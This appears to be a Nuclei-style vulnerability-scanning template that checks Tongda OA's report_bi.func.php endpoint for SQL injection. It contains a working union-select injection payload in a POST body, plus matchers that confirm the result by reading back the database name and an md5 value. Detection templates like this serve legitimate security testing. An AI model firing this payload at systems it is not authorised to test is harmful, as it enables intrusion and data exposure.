id: poc-tongda-oa-sqli

info:
  name: Tongda OA report_bi.func.php SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL Injection vulnerability in Tongda OA's report_bi.func.php that allows attackers to execute arbitrary SQL commands.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/general/bi_design/appcenter/report_bi.func.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "_POST[dataset_id]=efgh'-@`'`)union+select+database(),2,md5({{t1}})#'&action=get_link_info&"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"col\": \"td_oa\""
          - "{{t2}}"
      - type: word
        part: body
        words:
          - "<"
        negative: true
